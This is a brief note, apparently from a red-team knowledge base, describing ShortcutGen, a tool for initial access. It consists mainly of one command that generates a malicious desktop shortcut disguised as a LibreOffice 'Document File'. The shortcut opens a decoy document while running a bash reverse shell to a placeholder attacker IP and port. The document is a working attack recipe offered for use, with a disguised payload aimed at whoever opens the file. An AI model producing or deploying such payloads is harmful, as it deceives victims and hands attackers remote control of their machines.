# Offensive Tools

## [[03 - Offensive Infrastructure/E - Setup Machine/0x03 - Offensive Tools/Initial Access/ShortcutGen|ShortcutGen]]

Generate a payload with one-liner reverse shell.

```
$ shortcutgen -p desktop -n "Document File" -c "libreoffice" -a " --writer \"\$(pwd)/.real_document.odt\"; /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1" -i "libreoffice-writer" -wd "/tmp/" -w "false" -o payload.desktop
```